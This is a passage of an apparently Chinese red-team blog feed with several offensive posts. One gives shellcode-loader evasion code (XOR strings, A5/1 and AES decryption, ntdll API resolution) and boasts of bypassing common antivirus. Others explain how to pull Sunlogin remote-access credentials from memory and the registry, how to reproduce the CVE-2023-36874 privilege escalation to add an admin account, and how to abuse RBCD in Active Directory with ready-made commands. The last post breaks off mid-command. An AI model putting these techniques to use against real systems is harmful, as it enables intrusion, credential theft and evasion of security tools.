<span class="constructor">XOR((<span class="params">char</span> <span class="operator">*</span>)</span> s_dll, sizeof(s_dll), s_key, sizeof(s_key));</span><br><span class="line">  <span class="constructor">XOR((<span class="params">char</span> <span class="operator">*</span>)</span> s_mb, sizeof(s_mb), s_key, sizeof(s_key));</span><br><span class="line">  wchar_t wtext<span class="literal">[<span class="number">20</span>]</span>;</span><br><span class="line">  mbstowcs(wtext, s_dll, strlen(s_dll)+<span class="number">1</span>); <span class="comment">//plus null</span></span><br><span class="line">  LPWSTR user_dll = wtext;</span><br><span class="line">  HMODULE <span class="keyword">mod</span> = my<span class="constructor">GetModuleHandle(<span class="params">user_dll</span>)</span>;</span><br><span class="line">    <span class="constructor">XOR((<span class="params">char</span><span class="operator">*</span>)</span>encryptedpad_len, my_secret_key, sizeof(my_secret_key));</span><br><span class="line">    a5<span class="constructor">_1_decrypt(<span class="params">key</span>, <span class="params">key_len</span>, <span class="params">encrypted</span>, <span class="params">pad_len</span>, <span class="params">decrypted</span>)</span>;</span><br><span class="line">    <span class="constructor">XOR((<span class="params">char</span><span class="operator">*</span>)</span>s_NAVM, sizeof(s_NAVM), s_key, sizeof(s_key));</span><br><span class="line">    <span class="constructor">XOR((<span class="params">char</span><span class="operator">*</span>)</span>s_dll, sizeof(s_dll), s_key, sizeof(s_key));</span><br><span class="line">    <span class="constructor">XOR((<span class="params">char</span><span class="operator">*</span>)</span>s_mb, sizeof(s_mb), s_key, sizeof(s_key));</span><br><span class="line">    wchar_t wtext<span class="literal">[<span class="number">20</span>]</span>;</span><br><span class="line">    mbstowcs(wtext, s_dll, strlen(s_dll) + <span class="number">1</span>); <span class="comment">//plus null</span></span><br><span class="line">    LPWSTR ntdll_dll = wtext;</span><br><span class="line">    HMODULE <span class="keyword">mod</span> = my<span class="constructor">GetModuleHandle(<span class="params">ntdll_dll</span>)</span>;</span><br><span class="line">    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)my<span class="constructor">GetProcAddress(<span class="params">mod</span>, (LPCSTR)</span>s_NAVM);</span><br><span class="line">    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)my<span class="constructor">GetProcAddress(<span class="params">mod</span>, (LPCSTR)</span>s_mb);</span><br><span class="line">  return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="shellcode加密"><a href="#shellcode加密" class="headerlink" title="shellcode加密"></a>shellcode加密</h1><p>XOR+DES+a5_1</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> a5_1_decrypt(unsigned char* key, <span class="built_in">int</span> key_len, unsigned char* cipher, <span class="built_in">int</span> cipher_len, unsigned char* <span class="keyword">out</span>) &#123;</span><br><span class="line">    <span class="comment">// initialization</span></span><br><span class="line">    unsigned <span class="built_in">int</span> R1 = <span class="number">0</span>, R2 = <span class="number">0</span>, R3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">int</span> feedback = ((key[i % key_len] &gt;&gt; (i / <span class="number">8</span>)) &amp; <span class="number">1</span>) ^ ((R1 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">1</span>) ^ ((R2 &gt;&gt; <span class="number">21</span>) &amp; <span class="number">1</span>) ^ ((R3 &gt;&gt; <span class="number">22</span>) &amp; <span class="number">1</span>);</span><br><span class="line">        R1 = (R1 &lt;&lt; <span class="number">1</span>) | feedback;</span><br><span class="line">        R2 = (R2 &lt;&lt; <span class="number">1</span>) | ((R1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span>);</span><br><span class="line">        R3 = (R3 &lt;&lt; <span class="number">1</span>) | ((R2 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// decryption</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; cipher_len; i++) &#123;</span><br><span class="line">        <span class="built_in">int</span> feedback = A5_STEP((R1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span>, (R2 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">1</span>, (R3 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">1</span>);</span><br><span class="line">        unsigned char key_byte = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">int</span> bit = A5_STEP((R1 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">1</span>, (R2 &gt;&gt; <span class="number">21</span>) &amp; <span class="number">1</span>, (R3 &gt;&gt; <span class="number">22</span>) &amp; <span class="number">1</span>) ^ feedback;</span><br><span class="line">            key_byte |= bit &lt;&lt; j;</span><br><span class="line">            R1 = (R1 &lt;&lt; <span class="number">1</span>) | bit;</span><br><span class="line">            R2 = (R2 &lt;&lt; <span class="number">1</span>) | ((R1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span>);</span><br><span class="line">            R3 = (R3 &lt;&lt; <span class="number">1</span>) | ((R2 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">out</span>[i] = cipher[i] ^ key_byte;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">void</span> XOR(char* data, size_t data_len, char* key, size_t key_len) &#123;</span><br><span class="line">    <span class="built_in">int</span> j;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; data_len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == key_len - <span class="number">1</span>) j = <span class="number">0</span>;</span><br><span class="line">        data[i] = data[i] ^ key[j];</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> deAES() &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// decrypt with ECB mode</span></span><br><span class="line">        ECB_Mode&lt; AES &gt;::Decryption d;</span><br><span class="line">        d.SetKey(key, sizeof(key));</span><br><span class="line">        StringSource(strPlain, <span class="literal">true</span>,</span><br><span class="line">            new HexDecoder(</span><br><span class="line">                new StringSink(strCipher)</span><br><span class="line">            ) <span class="comment">//</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// The StreamTransformationFilter removes padding as required.</span></span><br><span class="line">        StringSource s(strCipher, <span class="literal">true</span>,</span><br><span class="line">            new StreamTransformationFilter(d,</span><br><span class="line">                new StringSink(strRecovered) <span class="comment">// StringSink</span></span><br><span class="line">            ) <span class="comment">// StreamTransformationFilter</span></span><br><span class="line">        ); <span class="comment">// StringSource</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        cerr &lt;&lt; e.what() &lt;&lt; endl;</span><br><span class="line">        exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码就不在这里一一展现了，核心代码都给了，免杀是一个持久化的过程，任何免杀效果在长期来看都是无意义的，主要是学习一个免杀思路。</p><h1 id="免杀情况展示"><a href="#免杀情况展示" class="headerlink" title="免杀情况展示"></a>免杀情况展示</h1><p>用的是原版CS</p><img src="/2023/08/29/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/1.png" class=""><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.ascotbe.com/2020/05/21/BypassTheVirtualMachine/#%E6%A3%80%E6%9F%A5%E6%97%B6%E9%97%B4%E6%B5%81%E5%8A%A8%E6%80%A7" target="_blank" rel="noopener">木马绕过虚拟机</a></p><p><a href="https://cocomelonc.github.io/malware/2023/06/04/malware-tricks-31.html" target="_blank" rel="noopener">免杀</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个马子倒是提前就研究好了，但是因为前段时间项目要用到，所以得等项目结束后再发出来，免得杀软检测了。免杀效果还行，不做沙箱对抗的话，常见的麦咖啡、卡巴斯基、小红伞、赛门铁克、defender、天擎都能过。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>向日葵密码抓取（综合）</title>
    <link href="https://chenzidu.github.io/2023/08/29/%E5%90%91%E6%97%A5%E8%91%B5%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%EF%BC%88%E7%BB%BC%E5%90%88%EF%BC%89/"/>
    <id>https://chenzidu.github.io/2023/08/29/%E5%90%91%E6%97%A5%E8%91%B5%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%EF%BC%88%E7%BB%BC%E5%90%88%EF%BC%89/</id>
    <published>2023-08-29T09:15:40.000Z</published>
    <updated>2024-03-11T07:52:30.442Z</updated>
    
    <content type="html"><![CDATA[<p>向日葵新版密码抓取，必须dump内存，十六进制查找，新版不存在配置文件中，后续会将其他工具的最新手法也同步到博客中来，嗯等我有空的话。。</p><a id="more"></a><p><a name="TV6wQ"></a></p><h2 id="最新版本-内存查找"><a href="#最新版本-内存查找" class="headerlink" title="最新版本-内存查找"></a>最新版本-内存查找</h2><p>首先找到向日葵用户进程，然后使用procdump等工具转储进程内存。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist <span class="string">/v</span> | findstr <span class="string">/i</span> sunlogin</span><br><span class="line">procdump64.exe -accepteula -ma 进程号</span><br></pre></td></tr></table></figure><p>使用Winhex打开转储文件，按下Ctrl+Alt+X快捷键打开十六进制值搜索功能，搜索十六进制值66617374636F646522203A20226b，即可找到本机识别码。<br /></p><p>jpg %}1.png %}</p><p><br />搜索十六进制值000000000000003C6620663D79616865692E626F6C642E323420633D 636F6C6F725F65646974203E，使用F3快捷键可以跳到下一个匹配处，多跳2次即可找到本机验证码。<br /></p><p>jpg %}2.png %}</p><p><a name="POI5p"></a></p><h2 id="默认配置文件路径"><a href="#默认配置文件路径" class="headerlink" title="默认配置文件路径:"></a>默认配置文件路径:</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装版：C:<span class="symbol">\P</span>rogram Files<span class="symbol">\O</span>ray<span class="symbol">\S</span>unLogin<span class="symbol">\S</span>unloginClient<span class="symbol">\c</span>onfig.ini</span><br><span class="line">便携版：C:<span class="symbol">\P</span>rogramData<span class="symbol">\O</span>ray<span class="symbol">\S</span>unloginClient<span class="symbol">\c</span>onfig.ini</span><br></pre></td></tr></table></figure><p>![解密](3.png %}</p><p>jpg %}4.png %}</p><p><a name="oBv2C"></a></p><h2 id="新版本-注册表查找"><a href="#新版本-注册表查找" class="headerlink" title="新版本-注册表查找"></a>新版本-注册表查找</h2><p>在向日葵v11.1.2.38529中，强化了加密机制，删除了配置文件config.ini中的fastcode（本机识别码）字段和encry_pwd(本机验证码)字段，而将这些敏感信息放到了注册表中，我们可以通过注册表查询使用Sunflower_get_Password[5]工具即可解密。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_USERS<span class="symbol">\.</span>DEFAULT<span class="symbol">\S</span>oftware<span class="symbol">\O</span>ray<span class="symbol">\S</span>unLogin<span class="symbol">\S</span>unloginClient<span class="symbol">\S</span>unloginInfo</span><br><span class="line">reg query HKEY_USERS<span class="symbol">\.</span>DEFAULT<span class="symbol">\S</span>oftware<span class="symbol">\O</span>ray<span class="symbol">\S</span>unLogin<span class="symbol">\S</span>unloginClient<span class="symbol">\S</span>unloginGreenInfo</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;向日葵新版密码抓取，必须dump内存，十六进制查找，新版不存在配置文件中，后续会将其他工具的最新手法也同步到博客中来，嗯等我有空的话。。&lt;/p&gt;</summary>
    
    
    
    <category term="password" scheme="https://chenzidu.github.io/categories/password/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>WINDOWS错误报告服务权限提升漏洞-CVE-2023-36874（复现）</title>
    <link href="https://chenzidu.github.io/2023/08/29/CVE-2023-36874%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/"/>
    <id>https://chenzidu.github.io/2023/08/29/CVE-2023-36874%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</id>
    <published>2023-08-29T08:47:59.000Z</published>
    <updated>2024-03-11T07:47:58.298Z</updated>
    
    <content type="html"><![CDATA[<p>太久没写博客了，最近这段时间项目太多了有点忙，简单把最近跟进的cve复现一下，因为这个是提权漏洞，提权后需要运行自己的exp文件，因为考虑到可能会被查杀，所以文件就不放出来了。</p><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windows错误报告服务是一项用于收集和分析系统和应用程序错误的服务。当发生应用程序崩溃、操作系统故障或其他错误时，Windows错误报告服务会自动收集有关错误的信息。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">漏洞成因：</span><br><span class="line"><span class="selector-tag">WER</span>服务从<span class="selector-tag">wer</span><span class="selector-class">.dll</span>调用<span class="selector-tag">WerpSubmitReportFromStore</span>函数</span><br><span class="line">↓</span><br><span class="line">该函数会运行<span class="selector-tag">UtilLaunchWerManager</span>函数</span><br><span class="line">↓</span><br><span class="line">导致执行<span class="selector-tag">CreateProcess</span>函数。</span><br><span class="line">↓</span><br><span class="line">最终去执行<span class="selector-tag">C</span>:\<span class="selector-tag">Windows</span>\<span class="selector-tag">System32</span>\<span class="selector-tag">wermgr</span><span class="selector-class">.exe</span>文件。</span><br><span class="line">而攻击者通过控制重定向后的文件，来使他执行恶意的<span class="selector-tag">wermgr</span><span class="selector-class">.exe</span>文件。</span><br></pre></td></tr></table></figure><p>![漏洞造成原因](1.png %}</p><h2 id="打包流程"><a href="#打包流程" class="headerlink" title="打包流程"></a>打包流程</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">打开x64 Native VS命令提示符并转到项目目录</span><br><span class="line"><span class="comment">## 打包. res文件</span></span><br><span class="line">rc.exe Resource.rc</span><br><span class="line"></span><br><span class="line"><span class="comment">## 编译主文件</span></span><br><span class="line">cl main.cpp /EHsc /DUNICODE /link ole32<span class="class">.<span class="keyword">lib</span> <span class="title">oleaut32</span>.<span class="title">lib</span> <span class="title">Resource</span>.<span class="title">res</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">## CD到wermgr目录wermgr.exe打包</span></span><br><span class="line"></span><br><span class="line">cl main.cpp /EHsc /DUNICODE /Fewermgr.exe</span><br></pre></td></tr></table></figure><h2 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h2><pre><code>编译后的wermgr. exe，在C:\下新建test\System32文件夹。复制到c:\test\system32\wermgr.exe</code></pre><p>![文件位置](2.png %}</p><p>编译后的漏洞利用复制到易受攻击的机器并运行它。确保您运行它的用户不是本地管理员。<br>这应该会在机器上创建“admin”用户。</p><h2 id="创建管理员账户"><a href="#创建管理员账户" class="headerlink" title="创建管理员账户"></a>创建管理员账户</h2><pre><code>编写自己的恶意程序，默认给的添加账户因为太简单，会被火绒查杀。添加账户、设为管理员、添加远程登陆</code></pre><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">main</span><span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure><p>![实现效果](3.png %}</p><h2 id="参考项目"><a href="#参考项目" class="headerlink" title="参考项目"></a>参考项目</h2><p><a href="https://github.com/Wh04m1001/CVE-2023-36874" target="_blank" rel="noopener">https://github.com/Wh04m1001/CVE-2023-36874</a><br><a href="https://github.com/crisprss/CVE-2023-36874" target="_blank" rel="noopener">https://github.com/crisprss/CVE-2023-36874</a><br><a href="https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/" target="_blank" rel="noopener">https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;太久没写博客了，最近这段时间项目太多了有点忙，简单把最近跟进的cve复现一下，因为这个是提权漏洞，提权后需要运行自己的exp文件，因为考虑到可能会被查杀，所以文件就不放出来了。&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://chenzidu.github.io/categories/CVE/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>基于资源的约束性委派利用（RBCD）</title>
    <link href="https://chenzidu.github.io/2023/03/15/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%EF%BC%88RBCD%EF%BC%89/"/>
    <id>https://chenzidu.github.io/2023/03/15/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%EF%BC%88RBCD%EF%BC%89/</id>
    <published>2023-03-15T06:08:18.000Z</published>
    <updated>2024-03-11T07:47:58.298Z</updated>
    
    <content type="html"><![CDATA[<p><a name="SDvMQ"></a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在Windows Server 2012中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。</p><a id="more"></a><p><a name="juYpU"></a></p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>msDS-AllowedToActOnBehalfOfOtherIdentity属性作用是控制哪些用户可以模拟成域内任意用户然后向该计算机进行身份验证。如果将这个属性的值配置成我们已经拿到密码的一个机器账户的话，那我们就能以任意成员的身份去控制配置了这个属性的主机。<br />举个例子：在域中，web-Mail$是我们已经拿到密码的机器账户，而我们有权利对web-Mail$这台主机的msDS-AllowedToActOnBehalfOfOtherIdentity属性进行修改，那么我们就能拿到web-Mail$这台主机的所有权限。<br />换句话说如果我们拥有配置某台主机msDS-AllowedToActOnBehalfOfOtherIdentity的权限与创建机器账户的权限，那我们就拿到了此机器的所有权限。<br /><strong>为什么是机器账户，不能是普通用户的账户？</strong></p><blockquote><p>因为攻击的时候会利用到S4U2Self协议，S4U2Self只适用于具有SPN的账户，普通账户是没有SPN的，而<strong>机器账户</strong>默认注册host服务的SPN（host服务中包含cifs、ldap等）。</p></blockquote><p>![image.png](2.png %}<br><a name="k0mie"></a></p><h4 id="谁可以修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性"><a href="#谁可以修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性" class="headerlink" title="谁可以修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性?"></a>谁可以修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性?</h4><blockquote><ol><li>这台主机的机器账户.</li><li>将这台主机加入到域内的域用户，<strong>该域用户具有对该主机的WriteProperty权限。</strong>（WriteProperty是指拥有写入对象属性的权限）</li></ol></blockquote><p><a name="JFjiG"></a></p><h4 id="域里常见可利用的ACL"><a href="#域里常见可利用的ACL" class="headerlink" title="域里常见可利用的ACL"></a>域里常见可利用的ACL</h4><ul><li>GenericAll ：授予目标对象的完全控制权，包括WriteDacl和WriteOwner特权。</li><li>GenericWrite ：此权限能够更新目标对象的属性值</li><li>Self-Membership ：这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)</li><li>WriteProperty ：WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限</li><li>WriteOwner ：WriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限</li><li>WriteDacl ：WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利<br><a name="Q0zDY"></a></li></ul><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><strong>获得机器账户或者获得将该机器拉入域内的域账户。</strong><br><a name="wy7Ho"></a></p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>1、拿到拉入域内机器的域账户<br />2、利用该域账户添加域机器<br />3、修改msDS-AllowedToActOnBehalfOfOtherIdentity值为机器账户的sid<br />4、以机器账户的身份伪造administrator申请一张访问此机器账户的ticket，因为机器账户没有配置约束性委派，所以该<br><a name="KLdDi"></a></p><h2 id="查询方法"><a href="#查询方法" class="headerlink" title="查询方法"></a>查询方法</h2><p><a name="pfqvj"></a></p><h3 id="msDS-AllowedToActOnBehalfOfOtherIdentity修改权限"><a href="#msDS-AllowedToActOnBehalfOfOtherIdentity修改权限" class="headerlink" title="msDS-AllowedToActOnBehalfOfOtherIdentity修改权限"></a>msDS-AllowedToActOnBehalfOfOtherIdentity修改权限</h3><blockquote><p>GenericAll、GenericWrite、WriteProperty、WriteDacl等等权限都是可以修改账户属性的。</p></blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity susan -Properties objectsid</span><br><span class="line">Get-DomainUser -Identity web<span class="number">-2012</span></span><br><span class="line">全局搜索 SecurityIdentifier             : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1255055821</span><span class="number">-1061842389</span><span class="number">-129624233</span><span class="number">-2103</span></span><br></pre></td></tr></table></figure><p>![image.png](3.png %}<br><a name="eJ3B2"></a></p><h3 id="查找将域内机器拉入域的用户SID"><a href="#查找将域内机器拉入域的用户SID" class="headerlink" title="查找将域内机器拉入域的用户SID"></a>查找将域内机器拉入域的用户SID</h3><blockquote><p>如果一个账号没有mS-DS-CreatorSID，那么其是被域管拉入域内的。</p></blockquote><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">## 通过ADFind查找将域机器拉入域的用户的SID</span><br><span class="line">.\AdFind.exe -<span class="keyword">b </span><span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369))"</span> <span class="meta">cn</span> mS-DS-CreatorSID</span><br></pre></td></tr></table></figure><p>![image.png](4.png %}</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\AdFind.exe -b "DC=redteam,DC=com" -f "(&amp;(objectsid=S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1255055821</span><span class="string">-1061842389</span><span class="string">-129624233</span><span class="string">-2103</span>))" objectclass cn dn</span><br></pre></td></tr></table></figure><p>![image.png](5.png %}<br><a name="WmxqQ"></a></p><h3 id="定位域用户SID对应的用户名"><a href="#定位域用户SID对应的用户名" class="headerlink" title="定位域用户SID对应的用户名"></a>定位域用户SID对应的用户名</h3><blockquote><p>samAccountType（账号类型）的值最后三位是369证明这是一台机器或者说是机器账号，如果是368就是一个账号(服务账号或者普通账号)。</p></blockquote><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看当前域账户sid</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">定位当前域账户加入的机器账户</span><br><span class="line">.\AdFind.exe -b "DC=redteam,DC=com" -f "(&amp;(samAccountType=805306369)(mS-DS-CreatorSID=S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1255055821</span><span class="string">-1061842389</span><span class="string">-129624233</span><span class="string">-2103</span>))" cn sAMAccountType objectCategory</span><br></pre></td></tr></table></figure><p>![image.png](6.png %}<br>![image.png](7.png %}<br><a name="uPjRV"></a></p><h2 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h2><p><a name="NpOC3"></a></p><h3 id="1、新建机器账户"><a href="#1、新建机器账户" class="headerlink" title="1、新建机器账户"></a>1、新建机器账户</h3><p><a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">Powermad</a><br /><a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview" target="_blank" rel="noopener">SharpView</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建机器用户</span></span><br><span class="line">powershell <span class="literal">-exec</span> bypass  <span class="string">'&amp;&#123;import-module .\Powermad.ps1; New-MachineAccount -MachineAccount test2023 -Password $(ConvertTo-SecureString "xxxxxx" -AsPlainText -Force) -Verbose &#125;'</span></span><br><span class="line"></span><br><span class="line">test2023/ASD123=</span><br><span class="line"></span><br><span class="line"><span class="comment">#查询新建机器的SID</span></span><br><span class="line">.\SharpView.exe <span class="built_in">Get-DomainComputer</span> <span class="literal">-Identity</span> test2023 <span class="literal">-Properties</span> objectsid,name,distinguishedname</span><br></pre></td></tr></table></figure><p>![image.png](8.png %}<br/><br>![image.png](9.png %}<br><a name="ztBtu"></a></p><h3 id="2、修改目标机器msds-allowedtoactonbehalfofotheridentity属性"><a href="#2、修改目标机器msds-allowedtoactonbehalfofotheridentity属性" class="headerlink" title="2、修改目标机器msds-allowedtoactonbehalfofotheridentity属性"></a>2、修改目标机器msds-allowedtoactonbehalfofotheridentity属性</h3><p><a name="MTmkW"></a></p><h4 id="win-server-2012以下："><a href="#win-server-2012以下：" class="headerlink" title="win server 2012以下："></a>win server 2012以下：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1255055821-1061842389-129624233-1118)"</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainComputer</span> web<span class="literal">-2012</span>| <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">'msds-allowedtoactonbehalfofotheridentity'</span>=<span 